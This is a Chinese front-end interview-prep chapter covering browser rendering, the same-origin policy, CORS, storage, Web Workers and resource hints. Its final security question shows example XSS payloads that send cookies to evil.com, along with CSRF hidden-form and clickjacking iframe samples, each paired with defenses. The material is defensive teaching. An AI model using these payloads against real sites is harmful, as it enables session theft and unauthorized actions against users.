## 第6章：浏览器原理（8 题）

### 题目1：从输入URL到页面展示的完整过程

**答案：**

从输入URL到页面展示，大致可以分为以下几个阶段：

**1. URL解析**

浏览器首先对输入的内容进行解析，判断是搜索关键词还是合法的URL。如果是URL，则补全协议（默认补全 `https://`），然后进行URL编码处理。

**2. DNS解析（域名解析）**

浏览器缓存 -> 系统缓存 -> 路由器缓存 -> ISP DNS缓存 -> 递归/迭代查询根DNS服务器 -> 顶级域名服务器 -> 权威DNS服务器，最终获取目标服务器的IP地址。

```
浏览器DNS缓存（chrome://net-internals/#dns）
  -> 操作系统DNS缓存（hosts文件）
    -> 本地DNS服务器（如 114.114.114.114）
      -> 根域名服务器（.）
        -> 顶级域名服务器（.com）
          -> 权威域名服务器（example.com）
```

DNS优化手段：DNS预解析（`<link rel="dns-prefetch">`）、DNS-over-HTTPS（DoH）、HTTPDNS。

**3. TCP连接（三次握手）**

拿到IP地址后，浏览器与服务器建立TCP连接：

```
客户端 -> SYN -> 服务器
客户端 <- SYN+ACK <- 服务器
客户端 -> ACK -> 服务器
```

如果是HTTPS，还需要TLS握手过程。

**4. 发送HTTP请求**

建立连接后，浏览器发送HTTP请求报文，包括请求行（方法、URL、版本）、请求头（Host、User-Agent、Accept等）、请求体（POST请求）。

**5. 服务器处理请求并返回响应**

服务器接收请求，处理后返回HTTP响应报文，包括状态行（状态码）、响应头（Content-Type、Cache-Control等）、响应体（HTML内容）。

**6. 浏览器解析与渲染**

这是最核心的步骤：

- **构建DOM树**：解析HTML，构建DOM（Document Object Model）树。
- **构建CSSOM树**：解析CSS，构建CSSOM（CSS Object Model）树。
- **构建渲染树**：将DOM树和CSSOM树合并，生成渲染树（Render Tree），只包含需要显示的节点。
- **布局（Layout/Reflow）**：计算每个节点的确切位置和大小。
- **绘制（Paint）**：将渲染树转换为屏幕上的像素。
- **合成（Composite）**：将各层合并，最终显示在屏幕上。

**7. TCP断开连接（四次挥手）**

```
客户端 -> FIN -> 服务器
客户端 <- ACK <- 服务器
客户端 <- FIN <- 服务器
客户端 -> ACK -> 服务器
```

**完整流程图：**

```
URL输入 -> URL解析 -> DNS解析 -> TCP连接 -> TLS握手(HTTPS) -> 发送HTTP请求
  -> 服务器处理 -> 返回响应 -> HTML解析 -> DOM树构建 -> CSSOM树构建
    -> 渲染树 -> 布局 -> 绘制 -> 合成 -> 页面展示
```

**考点：** 浏览器工作原理、DNS解析、TCP三次握手、HTTP请求响应、浏览器渲染流程

---

---

### 题目2：浏览器渲染过程

**答案：**

浏览器的渲染过程是前端面试中的核心考点，涉及从HTML/CSS到像素的完整转换流程。

**1. 构建DOM树**

浏览器将HTML字节流转换为字符，然后进行词法分析（Tokenization）生成Token，再将Token转换为节点（Node），最终构建成DOM树。

```html
<html>
  <head>
    <title>页面</title>
  </head>
  <body>
    <div>
      <p>Hello</p>
    </div>
  </body>
</html>
```

对应的DOM树结构：

```
document
  └── html
        ├── head
        │     └── title
        │           └── "页面"
        └── body
              └── div
                    └── p
                          └── "Hello"
```

**2. 构建CSSOM树**

与DOM树类似，浏览器解析CSS生成CSSOM树。CSSOM的构建是阻塞渲染的，因为CSS需要完整的解析才能确定每个元素的最终样式。

```css
body { font-size: 16px; }
p { color: red; }
```

**3. 构建渲染树（Render Tree）**

渲染树 = DOM树 + CSSOM树，但会过滤掉不可见的元素：

- `<head>`、`<meta>`、`<script>` 等不可见标签不会出现在渲染树中。
- `display: none` 的元素不会出现在渲染树中。
- `visibility: hidden` 的元素会出现在渲染树中（占空间但不可见）。

**4. 布局（Layout / Reflow）**

根据渲染树计算每个节点的几何信息（位置和大小），这个过程也称为"回流"或"重排"。

布局的计算从根节点开始，采用递归方式：

```
计算每个元素的：
- 宽度（width）
- 高度（height）
- 位置（top、left等）
- 边距（margin、padding、border）
```

**5. 绘制（Paint）**

将布局计算好的元素绘制到屏幕上。绘制过程会按照层叠顺序（z-index、stacking context）来绘制。

绘制阶段会将元素拆分为多个绘制指令，如绘制背景、绘制边框、绘制文字等。

**6. 合成（Composite）**

现代浏览器采用分层合成机制：

- 将页面分成多个图层（Layer）。
- 每个图层独立绘制。
- GPU将各图层合成为最终图像。

触发创建新图层的条件：
- 3D变换（`transform: translateZ(0)`）
- `will-change` 属性
- `<video>`、`<canvas>` 元素
- `opacity` 动画
- `position: fixed`

**7. 回流（Reflow）与重绘（Repaint）**

| 操作 | 影响 | 性能开销 |
|------|------|----------|
| 回流（Reflow） | 几何属性改变，需要重新布局 | 大 |
| 重绘（Repaint） | 外观属性改变，不需要重新布局 | 中 |
| 合成（Composite） | 仅图层变换，GPU加速 | 小 |

触发回流的常见操作：
```javascript
element.style.width = '100px';  // 回流
element.style.padding = '10px'; // 回流
element.style.color = 'red';    // 仅重绘
element.style.transform = 'translateX(10px)'; // 仅合成
```

**优化建议：**
- 使用 `transform` 代替 `top/left` 做动画。
- 避免频繁操作DOM样式，使用 `class` 批量修改。
- 使用 `requestAnimationFrame` 进行动画操作。
- 使用 `DocumentFragment` 批量添加DOM节点。
- 对复杂动画使用 `will-change` 提示浏览器创建独立图层。

**考点：** 渲染流程、DOM/CSSOM、回流重绘、合成层、性能优化

---

---

### 题目3：同源策略

**答案：**

**同源策略（Same-Origin Policy, SOP）** 是浏览器最核心的安全机制之一，它限制了不同源之间的文档或脚本如何交互。

**1. 什么是"同源"**

如果两个URL的**协议（protocol）**、**域名（domain）**、**端口（port）** 三者完全相同，则它们同源。

```
http://www.example.com:80/page1.html
http://www.example.com:80/page2.html  -> 同源 ✓

http://www.example.com:80/page1.html
https://www.example.com:80/page2.html -> 不同源 ✗（协议不同）

http://www.example.com:80/page1.html
http://sub.example.com:80/page2.html  -> 不同源 ✗（域名不同）

http://www.example.com:80/page1.html
http://www.example.com:8080/page2.html -> 不同源 ✗（端口不同）
```

**2. 同源策略限制的内容**

- **Cookie、LocalStorage、IndexedDB** 无法读取。
- **DOM** 无法获取（`iframe` 跨域无法操作父/子页面DOM）。
- **AJAX请求** 不能发送（会被浏览器拦截）。

**3. 同源策略不限制的内容**

- `<script>`、`<img>`、`<link>`、`<iframe>` 等标签的加载。
- `<form>` 表单的提交。
- `<a>` 标签的跳转。
- JavaScript中的 `window.location` 跳转。

**4. 为什么需要同源策略**

防止恶意网站读取其他网站的用户数据。例如：

```
用户登录了 bank.com（Cookie中存有session）
用户访问了 evil.com
evil.com 通过AJAX请求 bank.com/api/user -> 浏览器拦截（同源策略）
```

如果没有同源策略，evil.com 就可以冒充用户操作银行账户。

**5. 同源策略的"例外"**

| 机制 | 说明 |
|------|------|
| CORS | 服务端设置 `Access-Control-Allow-Origin` 允许跨域 |
| JSONP | 利用 `<script>` 标签不受同源策略限制的特性 |
| WebSocket | 不受同源策略限制（但握手时仍需Origin头验证） |
| postMessage | 跨窗口通信的安全方式 |

**考点：** 浏览器安全、同源判断、限制范围、安全意义

---

---

### 题目4：跨域解决方案

**答案：**

跨域问题是由同源策略引起的，以下是常见的解决方案：

**1. CORS（跨域资源共享）——最主流的方案**

CORS是W3C标准，通过服务端设置响应头来允许跨域请求。

**简单请求：**

满足以下条件的请求为简单请求：
- 方法为 GET、HEAD、POST 之一。
- Content-Type 为 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded` 之一。
- 没有自定义请求头。

服务端设置：
```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**预检请求（Preflight）：**

不满足简单请求条件时，浏览器会先发送一个 `OPTIONS` 请求进行预检：

```
OPTIONS /api/data HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type
```

服务端返回允许信息后，浏览器才会发送真正的请求。

**2. JSONP（已过时，了解即可）**

原理：利用 `<script>` 标签不受同源策略限制的特性。

```html
<!-- 前端 -->
<script>
function handleData(data) {
    console.log(data);
}
</script>
<script src="https://api.example.com/data?callback=handleData"></script>
```

```javascript
// 后端（Node.js示例）
app.get('/data', (req, res) => {
    const callback = req.query.callback;
    const data = { name: '张三', age: 25 };
    res.send(`${callback}(${JSON.stringify(data)})`);
});
```

缺点：只支持GET请求，存在XSS风险，无法处理错误。

**3. 代理服务器**

开发环境使用 `devServer.proxy`，生产环境使用Nginx反向代理。

```javascript
// webpack devServer 配置
module.exports = {
    devServer: {
        proxy: {
            '/api': {
                target: 'https://api.example.com',
                changeOrigin: true,
                pathRewrite: { '^/api': '' }
            }
        }
    }
};
```

```nginx
# Nginx 配置
server {
    listen 80;
    server_name example.com;

    location /api {
        proxy_pass https://api.example.com;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**4. postMessage（跨窗口通信）**

```javascript
// 父页面
const iframe = document.getElementById('myIframe');
iframe.contentWindow.postMessage({ type: 'hello', data: 'world' }, 'https://child.com');

// 子页面
window.addEventListener('message', (event) => {
    if (event.origin === 'https://parent.com') {
        console.log(event.data); // { type: 'hello', data: 'world' }
    }
});
```

**5. WebSocket**

WebSocket协议本身不受同源策略限制，但服务端仍可根据Origin头进行验证。

```javascript
const ws = new WebSocket('wss://api.example.com/ws');
ws.onmessage = (event) => {
    console.log(event.data);
};
```

**6. Nginx反向代理（生产环境推荐）**

通过同域名的Nginx服务器转发请求，从根本上避免跨域问题。

**各方案对比：**

| 方案 | 优点 | 缺点 |
|------|------|------|
| CORS | 标准方案，支持所有HTTP方法 | 需要后端配合 |
| JSONP | 兼容老浏览器 | 只支持GET，不安全 |
| 代理服务器 | 前端无感知，无跨域问题 | 需要服务器配置 |
| postMessage | 安全的跨窗口通信 | 仅限窗口间通信 |
| WebSocket | 双向通信，不受限 | 协议不同，需后端支持 |

**考点：** CORS原理、JSONP原理、代理方案、postMessage、跨域场景

---

---

### 题目5：浏览器存储（Cookie / Storage / IndexedDB）

**答案：**

浏览器提供了多种存储方式，各有特点和适用场景。

**1. Cookie**

Cookie是服务器发送到浏览器并保存在本地的一小块数据，主要用于状态管理。

```javascript
// 设置Cookie
document.cookie = 'username=zhangsan; max-age=3600; path=/; secure; samesite=Strict';

// 读取Cookie
console.log(document.cookie); // "username=zhangsan; theme=dark"
```

| 属性 | 说明 |
|------|------|
| `max-age` | 过期时间（秒），`Max-Age=0` 删除Cookie |
| `expires` | 过期时间（GMT格式），与max-age二选一 |
| `path` | Cookie生效的路径 |
| `domain` | Cookie生效的域名 |
| `secure` | 仅HTTPS传输 |
| `httpOnly` | 禁止JavaScript访问（防XSS） |
| `sameSite` | `Strict`/`Lax`/`None`，控制跨站请求是否携带 |

**特点：**
- 容量限制约 4KB。
- 每次HTTP请求都会自动携带。
- 可设置过期时间。
- `httpOnly` 属性可防止XSS攻击。

**2. localStorage**

```javascript
// 存储数据
localStorage.setItem('key', 'value');
localStorage.setItem('user', JSON.stringify({ name: '张三', age: 25 }));

// 读取数据
const value = localStorage.getItem('key');
const user = JSON.parse(localStorage.getItem('user'));

// 删除数据
localStorage.removeItem('key');

// 清空所有数据
localStorage.clear();

// 获取存储数量
console.log(localStorage.length);

// 获取第i个key
console.log(localStorage.key(0));
```

**特点：**
- 容量约 5-10MB。
- 永久存储，除非手动清除。
- 同源共享。
- 仅在客户端使用，不随请求发送。

**3. sessionStorage**

```javascript
// 用法与localStorage完全相同
sessionStorage.setItem('key', 'value');
sessionStorage.getItem('key');
```

**特点：**
- 容量约 5MB。
- 会话级存储，标签页关闭后清除。
- 不同标签页不共享（即使同源）。
- 仅在客户端使用。

**4. IndexedDB**

IndexedDB是浏览器内置的NoSQL数据库，适合存储大量结构化数据。

```javascript
// 打开/创建数据库
const request = indexedDB.open('myDatabase', 1);

request.onupgradeneeded = (event) => {
    const db = event.target.result;
    if (!db.objectStoreNames.contains('users')) {
        const store = db.createObjectStore('users', { keyPath: 'id' });
        store.createIndex('name', 'name', { unique: false });
        store.createIndex('email', 'email', { unique: true });
    }
};

request.onsuccess = (event) => {
    const db = event.target.result;

    // 添加数据
    const transaction = db.transaction('users', 'readwrite');
    const store = transaction.objectStore('users');
    store.add({ id: 1, name: '张三', email: 'zhangsan@example.com' });

    // 查询数据
    const getRequest = store.get(1);
    getRequest.onsuccess = () => {
        console.log(getRequest.result);
    };

    // 通过索引查询
    const index = store.index('name');
    const nameRequest = index.get('张三');
    nameRequest.onsuccess = () => {
        console.log(nameRequest.result);
    };
};
```

**特点：**
- 容量通常可达数百MB甚至更多。
- 支持事务（Transaction）。
- 支持索引（Index）。
- 异步API，不会阻塞主线程。
- 存储结构化数据（对象、文件等）。

**5. 对比总结**

| 特性 | Cookie | localStorage | sessionStorage | IndexedDB |
|------|--------|-------------|---------------|-----------|
| 容量 | ~4KB | ~5-10MB | ~5MB | 数百MB+ |
| 生命周期 | 可设置过期时间 | 永久 | 会话 | 永久 |
| 随请求发送 | 是 | 否 | 否 | 否 |
| 同源共享 | 是 | 是 | 否（标签页隔离） | 是 |
| API | 字符串API | 字符串API | 字符串API | 异步事务API |
| 适用场景 | 身份认证 | 持久化用户设置 | 表单临时数据 | 离线应用、大数据存储 |

**考点：** 存储方式对比、Cookie属性、localStorage/sessionStorage区别、IndexedDB使用

---

---

### 题目6：Web Worker

**答案：**

**Web Worker** 是浏览器提供的一种在后台线程中运行JavaScript的机制，用于执行耗时计算而不阻塞主线程（UI线程）。

**1. 基本使用**

```javascript
// main.js（主线程）
const worker = new Worker('worker.js');

// 向Worker发送数据
worker.postMessage({ type: 'calculate', data: [1, 2, 3, 4, 5] });

// 接收Worker返回的结果
worker.onmessage = (event) => {
    console.log('Worker计算结果：', event.data);
};

// 错误处理
worker.onerror = (error) => {
    console.error('Worker错误：', error);
};

// 终止Worker
worker.terminate();
```

```javascript
// worker.js（Worker线程）
self.onmessage = (event) => {
    const { type, data } = event.data;

    if (type === 'calculate') {
        // 执行耗时计算
        const result = data.reduce((sum, num) => sum + num, 0);
        // 将结果发送回主线程
        self.postMessage(result);
    }
};
```

**2. Worker的限制**

- **不能操作DOM**：Worker无法访问 `document`、`window` 对象。
- **不能使用部分API**：如 `localStorage`、`alert()`、`confirm()`。
- **同源限制**：Worker脚本文件必须与主页面同源。
- **通信开销**：主线程和Worker之间通过 `postMessage` 通信，数据会被序列化/反序列化（结构化克隆算法）。

**3. Worker可用的API**

- `setTimeout`、`setInterval`
- `fetch`、`XMLHttpRequest`
- `IndexedDB`
- `WebSocket`
- `navigator`（部分属性）
- `importScripts()`（加载外部脚本）

**4. 内联Worker（Blob方式）**

当Worker代码较简单时，可以使用Blob创建内联Worker：

```javascript
const workerCode = `
    self.onmessage = (event) => {
        const result = event.data * 2;
        self.postMessage(result);
    };
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);
const worker = new Worker(workerUrl);

worker.postMessage(10);
worker.onmessage = (event) => {
    console.log(event.data); // 20
    URL.revokeObjectURL(workerUrl);
    worker.terminate();
};
```

**5. SharedWorker（共享Worker）**

多个标签页可以共享同一个Worker实例：

```javascript
// main.js
const worker = new SharedWorker('shared-worker.js');
worker.port.start();
worker.port.postMessage('hello');
worker.port.onmessage = (event) => {
    console.log(event.data);
};
```

```javascript
// shared-worker.js
const ports = [];
self.onconnect = (event) => {
    const port = event.ports[0];
    ports.push(port);
    port.onmessage = (e) => {
        // 广播给所有连接的页面
        ports.forEach(p => p.postMessage(`收到：${e.data}`));
    };
};
```

**6. Transferable Objects（零拷贝传输）**

使用 `Transferable` 对象可以避免数据拷贝的开销：

```javascript
// 主线程
const buffer = new ArrayBuffer(1024 * 1024); // 1MB
const worker = new Worker('worker.js');
// 转移所有权，不进行拷贝
worker.postMessage({ buffer }, [buffer]);
// 转移后，主线程的buffer变为不可用
```

**7. 适用场景**

- 大数据处理和计算（如图片处理、加密解密）。
- 复杂算法运算（如排序、搜索）。
- WebSocket长连接管理。
- 预加载数据。

**考点：** Web Worker原理、通信机制、限制、使用场景、SharedWorker

---

---

### 题目7：DNS预解析和预加载

**答案：**

**1. DNS预解析（dns-prefetch）**

DNS解析是一个耗时过程（通常20-120ms），DNS预解析允许浏览器在用户点击链接之前提前解析域名。

```html
<!-- 显式声明需要预解析的域名 -->
<link rel="dns-prefetch" href="//cdn.example.com">
<link rel="dns-prefetch" href="//api.example.com">
```

浏览器还会自动对页面中的以下资源进行DNS预解析：
- `<a>` 标签的 `href`
- `<img>` 标签的 `src`
- CSS中的 `@import` 和 `url()`

**2. 预连接（preconnect）**

预连接不仅进行DNS解析，还包括TCP握手和TLS协商：

```html
<link rel="preconnect" href="https://cdn.example.com" crossorigin>
```

`preconnect` 比 `dns-prefetch` 更进一步，但占用更多资源，建议只对关键域名使用。

**3. 预加载（preload）**

`preload` 用于提前加载当前页面即将使用的资源：

```html
<!-- 预加载关键CSS -->
<link rel="preload" href="critical.css" as="style">

<!-- 预加载关键JS -->
<link rel="preload" href="app.js" as="script">

<!-- 预加载字体 -->
<link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin>

<!-- 预加载图片 -->
<link rel="preload" href="hero.jpg" as="image">
```

`as` 属性的常见值：`script`、`style`、`font`、`image`、`fetch`、`audio`、`video` 等。

**4. 预获取（prefetch）**

`prefetch` 用于提前加载下一页面可能需要的资源，优先级较低：

```html
<!-- 预获取下一页面的资源 -->
<link rel="prefetch" href="next-page.js" as="script">
<link rel="prefetch" href="next-page.css" as="style">
```

**5. 预渲染（prerender）**

`prerender` 会提前渲染整个页面（包括执行JS），用户访问时直接展示：

```html
<link rel="prerender" href="https://example.com/next-page">
```

注意：`prerender` 消耗大量资源，应谨慎使用。

**6. 模块预加载（modulepreload）**

专门用于ES模块的预加载：

```html
<link rel="modulepreload" href="app.mjs">
```

**7. 各方案对比**

| 技术 | 作用 | 优先级 | 适用场景 |
|------|------|--------|----------|
| `dns-prefetch` | DNS解析 | 低 | 第三方域名 |
| `preconnect` | DNS+TCP+TLS | 中 | 关键第三方资源 |
| `preload` | 加载当前页关键资源 | 高 | 字体、关键CSS/JS |
| `prefetch` | 加载下一页资源 | 低 | 路由切换、分页 |
| `prerender` | 预渲染整个页面 | 最低 | 确定用户下一步操作 |

**8. 实际应用示例**

```html
<head>
    <!-- DNS预解析：第三方域名 -->
    <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
    <link rel="dns-prefetch" href="//fonts.googleapis.com">

    <!-- 预连接：关键API域名 -->
    <link rel="preconnect" href="https://api.example.com" crossorigin>

    <!-- 预加载：关键资源 -->
    <link rel="preload" href="/static/css/critical.css" as="style">
    <link rel="preload" href="/static/js/app.js" as="script">
    <link rel="preload" href="/static/fonts/main.woff2" as="font" type="font/woff2" crossorigin>

    <!-- 预获取：下一页面资源 -->
    <link rel="prefetch" href="/static/js/next-page.js" as="script">
</head>
```

**考点：** 资源提示、性能优化、dns-prefetch、preload、prefetch、preconnect

---

---

### 题目8：前端安全（XSS / CSRF / 点击劫持）

**答案：**

**1. XSS（跨站脚本攻击）**

XSS攻击是指攻击者向页面注入恶意脚本，当用户浏览该页面时，恶意脚本会在用户浏览器中执行。

**XSS的三种类型：**

**（1）存储型XSS**

恶意脚本被存储在服务器上（如数据库），所有访问该页面的用户都会受影响。

```html
<!-- 攻击者在评论区提交 -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**（2）反射型XSS**

恶意脚本通过URL参数传递，需要诱导用户点击恶意链接。

```
https://example.com/search?q=<script>document.location='http://evil.com?c='+document.cookie</script>
```

**（3）DOM型XSS**

恶意脚本通过修改DOM来执行，完全在客户端发生。

```javascript
// 危险代码
document.getElementById('output').innerHTML = location.hash.substring(1);
// 攻击者构造URL：http://example.com/page#<img src=x onerror=alert(1)>
```

**XSS防御方案：**

```javascript
// 1. 对用户输入进行转义
function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, (tag) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
    }[tag]));
}

// 2. 使用textContent代替innerHTML
element.textContent = userInput; // 安全
element.innerHTML = userInput;   // 危险

// 3. 设置CSP（Content Security Policy）
// HTTP响应头
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

// 4. 设置HttpOnly Cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// 5. 使用DOMPurify库净化HTML
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
```

**2. CSRF（跨站请求伪造）**

CSRF攻击是指攻击者诱导用户在已登录的网站上执行非预期的操作。

**攻击原理：**

```
1. 用户登录了 bank.com，浏览器保存了Cookie
2. 用户访问了 evil.com
3. evil.com 页面中有一个隐藏表单：
   <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 浏览器自动携带bank.com的Cookie发送请求
5. 银行服务器认为是用户的合法操作
```

**CSRF防御方案：**

```javascript
// 1. CSRF Token
// 服务端生成token，前端在请求中携带
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrfToken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ to: 'bob', amount: 100 })
});

// 2. SameSite Cookie
Set-Cookie: session=abc123; SameSite=Strict  // 严格模式，完全禁止跨站携带
Set-Cookie: session=abc123; SameSite=Lax     // 宽松模式，允许GET导航携带

// 3. 验证Referer/Origin头
// 服务端检查请求的Origin是否为合法域名

// 4. 双重Cookie验证
// 前端从Cookie中读取token，放到请求头中，服务端对比Cookie和请求头中的token
```

**3. 点击劫持（Clickjacking）**

攻击者将目标网站嵌入到透明的 `iframe` 中，诱导用户点击。

```html
<!-- 攻击者页面 -->
<style>
    iframe {
        opacity: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
    }
</style>
<button>领取奖品</button>
<iframe src="https://bank.com/transfer?to=attacker"></iframe>
```

**防御方案：**

```http
# 1. X-Frame-Options响应头
X-Frame-Options: DENY          # 完全禁止被嵌入
X-Frame-Options: SAMEORIGIN    # 只允许同源嵌入

# 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'self'

# 3. JS防御
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

**4. 其他安全措施**

| 攻击类型 | 防御手段 |
|----------|----------|
| SQL注入 | 参数化查询、ORM |
| 中间人攻击 | HTTPS、HSTS |
| 传输层安全 | TLS 1.3、证书固定 |
| 接口安全 | 限流、签名验证、权限控制 |

**考点：** XSS类型与防御、CSRF原理与防御、点击劫持、CSP、HttpOnly、SameSite

---

## 第二部分：网络协议

---